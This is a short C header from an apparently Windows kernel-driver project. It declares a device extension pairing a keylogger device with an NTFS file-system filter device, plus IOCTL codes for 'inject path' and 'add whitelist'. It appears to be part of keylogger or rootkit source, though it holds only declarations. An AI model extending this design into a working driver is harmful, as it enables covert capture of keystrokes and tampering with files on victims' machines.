#pragma once

#include <ntddk.h>
#include "keylog.h"

typedef struct _MAIN_DEVICE_EXTENSION {
	PDEVICE_OBJECT pKeylogDevice; /* Pointer to Keylogger Device Object */
	PDEVICE_OBJECT pFilterDevice; /* Pointer to NTFS File-System Filter Device Object */
} MAIN_DEVICE_EXTENSION, *PMAIN_DEVICE_EXTENSION;

#define IOCTL_IG_INJECT_PATH    \
        CTL_CODE(FILE_DEVICE_UNKNOWN,        \
                 0x1001,                      \
                 METHOD_IN_DIRECT,           \
                 FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_IG_ADD_WHITELIST   \
        CTL_CODE(FILE_DEVICE_UNKNOWN,        \
                 0x1002,                      \
                 METHOD_OUT_DIRECT,          \
                 FILE_READ_DATA | FILE_WRITE_DATA)
